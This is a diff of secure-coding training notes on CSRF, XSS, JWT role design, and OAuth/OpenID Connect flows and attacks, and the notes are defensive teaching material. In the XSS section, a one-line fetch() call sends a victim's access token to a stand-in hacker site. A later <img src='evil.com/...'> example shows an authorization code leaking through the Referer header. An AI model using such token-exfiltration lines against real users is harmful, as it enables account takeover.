@@ -267,7 +267,7 @@ Secure Coding notes.txt
   - On that website, random people can post comments. 
   - And that website is vulnerable to XSS injection. You can actually include HTML in their comments. Or just the site wants to hack you? 
 
-  You are imune to CSRF iff any of::
+  You are imune to CSRF iff any of:
   - use SPA  (Angular..) not server-side generated HTML. 
   - Use JWT instead of Cookies for authn, as they are not sent automatically by the browser to the server, but only when you explicitly add them in the header of your fetch/ajax calls.
   - SameSite=Lax (or Strict if you can) << RESEARCH
@@ -283,6 +283,7 @@ Secure Coding notes.txt
   
 
 Can CORS be used to prevent XSS? 
+NO
 XSS = hacker makes your browser execute 😈 js
   ⇒ against the same application
   ⇒ fetch("hacker-site?jwt_i_got="+yourAT)
@@ -294,8 +295,8 @@ XSS = hacker makes your browser execute 😈 js
 
 === JWT design
   - what payload
-    a) role: "ADMIN" 😱for what app?
-    b) app: {"trainings":["ADMIN"],+30 apps}
+    a) global roles: "ADMIN" ("realm" in KeyCloak) 
+    b) app-specific roles: {"trainings":["ADMIN"],+30 apps} ("resource" in KeyCloak) 
     c) control-freak: {"trainings":["TRAINING_DELETE"+50 more],x 30 apps}
       😊 revoke individual tiny features
       😊 strict visibility in a central place 🤯❤️
@@ -310,4 +311,89 @@ XSS = hacker makes your browser execute 😈 js
   - [a]symmetric signed
   - what expiration
   - JWT exchange 
-  - JWE
+  - JWT={header, json_payload, digsig(json_payload, v_AS)}
+
+=== AccessToken Validation
+  - if opaque, call IdP to validate it = ONLINE validation
+    🙁 floods AuthServer
+  - if JWT, validate signature with the public key of the IdP you have its .cer in your trust store
+    🙁 Burns CPU, rotate .cer
+
+
+=== OAuth https://www.youtube.com/watch?v=5cQNwifDq1U on this branch amex26oauth
+  - why: decouple authn/authz from your app,
+  - OAuth Access Token can opaque (think: random) or JWT (self-contained, signed by IdP)
+  - OpenID Connect = OAuth + authn (who you are) + userinfo endpoint
+  - Tokens: 
+    - Access Token = for authz, sent to resource server (app you call with the token)
+    - Refresh Token = long-lived, used to get new access tokens when they expire, not sent to resource server
+    - ID Token = for authn, contains user info, sent to client app (SPA/mobile) after login, not sent to resource server
+  - Actors: Resource Owner (human), Client (app), Authorization Server (eg: Okta), Resource Server (app your're calling with AT)
+  - type of clients: confidential (backend) vs public (SPA/mobile)
+  
+  
+=== Use-Case 1: backend doing Authorizatiob code Flow + session to the browser
+  - commit "access code grant demo"
+  - SSO (single sign on) for humans works via an SSO Cookie set by the IdP (eg: Okta) on the browser, which is sent to the IdP on login attempts, and if valid, the IdP returns an Access Token to the browser, which is then sent to your app.
+  - Back-channel communication between your app and the IdP to exchange the Access Code for an Access Token
+  - client secret for confidential clients
+  - distributed logout is hard in SSO
+  - JWT token contains: realm (global)
+
+=== Use-Case 2: PKCE = JS frontend SPA gets an AT⭐️ to call a stateless❤️ REST API
+  - PKCE instead of Implicit Flow
+
+=== Use-Case 3: Client Credentials Flow = machine-to-machine doing 
+  - Use-Case: Stop the human AT earlier in the flow (to not expire, privacy)
+  - Use-Case: @Kafka/Rabbit Listener / @Scheduler
+  - Use-Case: Your company is using a 3rd party service using a Bearer AccessToken of my COMPANY.
+    A 'service-proxy' app represents this 3rd party service into your ecosystem, 
+    it makes no sense propagating employee JWTs out to that 3rd party service
+  - There is a sort of a manager that would take care to refresh the access token
+    whenever they expire before sending a call using that access token. 
+
+  - OAuth Attacks 🤯 [follow-up hour]
+
+
+=== What if the refresh token gets stolen?
+  - worst case: a hacker could use it ad infitum to produce more access tokens
+  - Refresh Token Rotation can reduce the vulneability window to the exp of tha acces token
+
+=== Access Token expires while in transit (exp: ~5m)
+  - I can't mutate the 'exp' claim in JWT, as the JWT will not validate against its signature.
+  - possible if a service calls take long to complete.
+  - at 10:00:00 FE -⭐️-> || BE1/ApiGatway -⭐️-> || BE2 (takes 5min before calls) -⭐️-> ||❌⚠️expired BE3
+  ⇒ refresh the access 2minutes in advance
+  ⇒ don't propagate FE AT⭐️ between BackEnds/microservices;
+    - instead BE1 get its own AT⭐️ (client-credential) identifies as a machine to call BE2
+    - BE-BE via Basic
+    - BE-BE over https: w/o identifying who the client is
+    BE1 may send to BE2 username ± roles in payload (header)
+  ⇒ Auto-Retry from FE iff op is idempotent 
+  ⇒ Not A Problem - we don't call more than three microservices in a chain & Our services are lightning fast! 
+
+=== AT Exchange
+  - Audience change: Issue a token that the recipient service trusts based on your original token of the sender. 
+  - Downscoping: Come with a very powerful token that can open 100 doors, and you exchange it with another token that can open two doors before giving it to an application of a lower security stance, of a lower trust. 
+  - Act-as (impersonation) cf policies: 😱Ops head can impersonate other ops employees/users.
+
+=== OAuth in Internet
+  - scopes
+  - You authorize the Facebook application to post in your name on your Twitter account. 
+  - Scope is called post tweet. 
+  The client application is Facebook. The authorization server is Twitter identity provider. The resource server is the Twitter API that you can call with the access token Facebook got. 
+  - Social login w/ Google eg: you must register an app with google, free
+  
+=== Attacks
+  Ref: https://datatracker.ietf.org/doc/html/rfc9700
+  - Open-Redirection👑 -- Valid Redirect URIs = "*"
+    after login, AS will send code/AT to a 😈 controller domain
+  - Confused Deputy -- the RS does not validate if AT grants permission for its resources, doesn't check scopes/roles in JWT
+  - AT Leak at RS -- a compromised service uses captured AT⭐️ to call other services
+    ⇒ minimal AT permissions = hard to design ; hard to tell in complex eco what you'll do later with that token
+    ⇒ network restrictions cross nodes
+  - Referrer/Browser History Leak
+    > if the page you open after AS redirects back with code you have an <img src="evil.com/img.gif"> the GET for that image automatically incldue a Referer: url reqyest with ?code=
+    ⇒ solution redirect immediately to home
+  - CSRF 
+  - Code Injection
